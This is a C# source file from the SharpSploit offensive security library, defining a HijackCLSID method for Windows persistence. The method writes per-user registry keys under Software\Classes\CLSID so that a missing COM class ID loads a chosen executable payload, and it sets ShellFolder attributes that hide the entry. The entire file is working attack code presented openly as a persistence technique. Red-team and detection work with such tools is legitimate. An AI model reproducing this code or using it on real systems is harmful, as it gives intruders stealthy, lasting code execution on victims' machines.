// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using Microsoft.Win32;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// COM is a class for abusing the Microsoft Component Object Model to establish peristence.
    /// </summary>
    public class COM
    {
        /// <summary>
        /// Hijacks a CLSID key to execute a payload. 
        /// </summary>
        /// <author>Dennis Panagiotopoulos (@den_n1s)</author>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit to Ruben Boonen (@FuzzySec) for his PowerShell implementation of this technique.
        /// </remarks>
        /// <param name="CLSID">Missing CLSID to abuse.</param>
        /// <param name="ExecutablePath">Path to the executable payload.</param>
        public static bool HijackCLSID(string CLSID, string ExecutablePath)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + CLSID + "}\\InProcServer32");
            key.SetValue("", ExecutablePath);
            key.SetValue("ThreadingModel", "Apartment");
            key.SetValue("LoadWithoutCOM", "");

            key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + CLSID + "}\\ShellFolder");
            key.SetValue("HideOnDesktop", "");
            key.SetValue("Attributes", unchecked((int)0xf090013d), RegistryValueKind.DWord);

            return true;
        } 
    }
}
